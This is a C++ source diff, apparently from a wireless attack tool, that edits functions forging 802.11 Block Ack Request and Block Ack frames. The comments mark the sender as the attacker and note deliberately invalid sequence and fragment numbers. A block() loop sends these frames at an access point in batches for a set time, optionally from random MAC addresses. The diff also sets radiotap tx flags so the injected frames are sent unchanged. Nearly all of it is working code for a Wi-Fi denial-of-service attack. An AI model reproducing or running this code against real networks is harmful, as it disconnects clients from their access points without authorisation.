@@ -46,39 +46,13 @@ RadioTap get_BAR_frame(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac, 
 	Dot11BlockAckRequest bar(ap_mac, sta_mac); //  STA(attacker) -> AP
 	bar.fragment_number(fn);
 	bar.start_sequence(sn);
-	const vector<uint8_t> payload_data = { 0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0x7f,
-		0x92,
-		0x08,
-		0x80 };
-	const RadioTap rt{}; //FIXME valid with all adapters? fill with driver?
+
+	const vector<uint8_t> payload_data = {
+		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x7f, 0x92, 0x08, 0x80
+	};
+	RadioTap rt{}; //FIXME valid with all adapters? fill with driver?
+	rt.tx_flags(0x28); // NOSEQ|ORDER
 	return rt / bar / RawPDU(payload_data);
 }
 
@@ -87,39 +61,12 @@ RadioTap get_BA_frame(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac) {
 	ba.fragment_number(4);			   // invalid FN
 	ba.start_sequence(1175);		   // random invalid SSN
 	ba.bar_control(0x0004);
-	const vector<uint8_t> payload_data = { 0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0xff,
-		0x7f,
-		0x92,
-		0x08,
-		0x80 };
-	const RadioTap rt{}; // fill with driver?
+	const vector<uint8_t> payload_data = {
+		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x7f, 0x92, 0x08, 0x80
+	};
+	RadioTap rt{}; //TODO at leas noORDER
+	rt.tx_flags(0x28); // NOSEQ|ORDER
 	return rt / ba / RawPDU(payload_data);
 }
 
@@ -194,12 +141,13 @@ void block(const HWAddress<6> &sta_mac, const HWAddress<6> &ap_mac, const string
 	while(steady_clock::now() < end_time) {
 		const HWAddress<6> sta_hw = is_random ? hw_capabilities::rand_mac() : sta_mac;
 		RadioTap frame;
-		if(attack_type == "BAR")
+		if(attack_type == "BAR") {
 			frame = get_BAR_frame(ap_mac, sta_hw);
-		else if(attack_type == "BA")
+		}else if(attack_type == "BA") {
 			frame = get_BA_frame(ap_mac, sta_hw);
-		else
+		}else {
 			frame = get_BAR_frame(ap_mac, sta_hw, bars_ctx.current_fn.load(), bars_ctx.current_sn.load());
+		}
 
 		const auto bytes = frame.serialize();
 		log(LogLevel::DEBUG, "Sending batch {}", iteration);
